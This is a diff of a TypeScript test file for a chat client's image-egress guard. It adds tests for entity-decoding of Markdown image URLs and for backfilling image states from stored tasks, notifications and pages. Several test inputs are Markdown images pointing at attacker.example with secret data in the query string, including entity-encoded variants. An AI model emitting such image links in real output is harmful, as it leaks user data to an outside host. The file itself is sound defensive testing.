@@ -27,6 +27,9 @@ describe("the pictures a text shows", () => {
   it("escapes and entities: every address the client may read is decided", () => {
     expect(markdownPictures("![](https://attacker.example/p.png?d=se\\_cret)")).toEqual(["https://attacker.example/p.png?d=se\\_cret", "https://attacker.example/p.png?d=se_cret"]);
     expect(markdownPictures("![](https://attacker.example/p.png?d=&#115;ecret&amp;x=1)")).toContain("https://attacker.example/p.png?d=secret&x=1");
+    // Hex entities in either case read as the client reads them; what is no character or no entity stays as written.
+    expect(markdownPictures("![](https://attacker.example/p.png?d=&#x73;e&#X63;ret)")).toContain("https://attacker.example/p.png?d=secret");
+    expect(markdownPictures("![](https://attacker.example/p.png?d=&#0;&#x110000;&bogus;)")).toEqual(["https://attacker.example/p.png?d=&#0;&#x110000;&bogus;"]);
   });
 
   it("a tool's picture fields and Markdown in its texts; a link to open is not a picture", () => {
@@ -114,9 +117,26 @@ describe("the verdicts", () => {
     );
     db.prepare("insert into feeds(id, title, brief, agent_id, times, weekdays, sources, enabled, created_at, updated_at) values ('f','F','','a','[]','[]','[]',1,?,?)").run(now, now);
     db.prepare("insert into feed_posts(id, feed_id, title, text, image, created_at) values ('p','f','T','![in](https://cdn.example.com/in.png)','https://cdn.example.com/post.jpg',?)").run(now);
+    db.prepare("insert into tasks(id, conversation_id, agent_id, title, goal, status, created_by, result, created_at, updated_at) values ('t','c1','a','T','g','done','user',?,?,?)").run(
+      "Done: ![chart](https://img.example.com/result.png)",
+      now,
+      now,
+    );
+    db.prepare("insert into notifications(id, level, title, body, created_at) values ('n','notify','N',?,?)").run("![b](https://img.example.com/notice.png)", now);
+    db.prepare("insert into pages(id, token, title, agent_id, cover, created_at, updated_at) values ('pg','tok','P','a','https://cdn.example.com/cover.png',?,?)").run(now, now);
     const pictures = new Pictures(db, new EgressGuard());
     pictures.backfill();
-    for (const u of ["https://img.example.com/old.png", "https://img.example.com/carousel.jpg", "https://cdn.example.com/post.jpg", "https://cdn.example.com/in.png"]) expect(pictures.state(u), u).toBe("shown");
+    for (const u of [
+      "https://img.example.com/old.png",
+      "https://img.example.com/carousel.jpg",
+      "https://cdn.example.com/post.jpg",
+      "https://cdn.example.com/in.png",
+      "https://img.example.com/result.png",
+      "https://img.example.com/notice.png",
+      "https://cdn.example.com/cover.png",
+    ]) {
+      expect(pictures.state(u), u).toBe("shown");
+    }
     // Once: what comes later is decided as it is stored.
     db.prepare("insert into messages(id, conversation_id, role, parts, status, created_at) values ('m2','c1','assistant',?,'complete',?)").run(JSON.stringify([{ type: "text", text: "![new](https://img.example.com/new.png)" }]), now);
     pictures.backfill();
